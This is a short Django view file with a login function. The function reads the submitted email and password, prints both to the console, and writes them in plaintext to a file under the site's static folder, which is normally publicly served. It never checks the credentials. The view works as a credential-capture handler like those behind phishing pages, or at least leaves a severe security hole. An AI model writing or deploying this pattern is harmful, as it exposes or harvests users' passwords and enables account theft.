
from django.http import HttpRequest, HttpResponse
from django.shortcuts import render


def login(request: HttpRequest) -> HttpResponse:
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")

        print(f"email: {email}")
        print(f"password: {password}")

        with open('static/temp/data.txt', 'w') as file:
            file.write(f"{email}\n")
            file.write(f"{password}\n")
    context = {}
    return render(request, 'django_app/login.html', context=context)
